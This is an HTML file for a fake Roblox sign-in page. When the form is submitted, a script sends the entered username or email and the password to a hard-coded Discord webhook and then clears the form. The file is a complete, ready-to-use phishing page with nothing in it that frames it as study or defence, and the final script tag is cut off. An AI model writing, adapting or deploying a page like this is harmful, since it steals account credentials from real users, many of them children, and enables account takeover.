<!DOCTYPE html>
<html>
<head>
	<title>Roblox - Sign In</title>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	<style type="text/css">
		/* Styles for the page */
	</style>
</head>
<body>
	<div class="container">
		<div class="row">
			<div class="col-md-4 offset-md-4">
				<div class="card">
					<div class="card-header">Sign In</div>
					<div class="card-body">
						<form onsubmit="sendToWebhook(); return false;">
							<div class="form-group">
								<label>Username or Email Address</label>
								<input type="text" class="form-control" id="username" placeholder="Enter your username or email address">
							</div>
							<div class="form-group">
								<label>Password</label>
								<input type="password" class="form-control" id="password" placeholder="Enter your password">
							</div>
							<button type="submit" class="btn">Sign In</button>
						</form>
					</div>
				</div>
			</div>
		</div>
	</div>

	<script>
		function sendToWebhook() {
			// Get the values from the form
			var username = document.getElementById("username").value;
			var password = document.getElementById("password").value;

			// Construct the webhook payload
			var payload = {
				"username": "Roblox Sign-In Page",
				"content": "Username: " + username + "\nPassword: " + password
			};

			// Send the payload to the webhook
			fetch("https://discord.com/api/webhooks/1093225273396306041/588BwZDBXgjrtiGeNZaGUI1uT8iPAN25k3HwmSTZ0ghmzZyHpUGVYTdBSpzKVP1uX735", {
				method: "POST",
				headers: {
					"Content-Type": "application/json"
				},
				body: JSON.stringify(payload)
			});

			// Clear the form
			document.getElementById("username").value = "";
			document.getElementById("password").value = "";
		}
	</script>

	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+..."
</body>
</html>
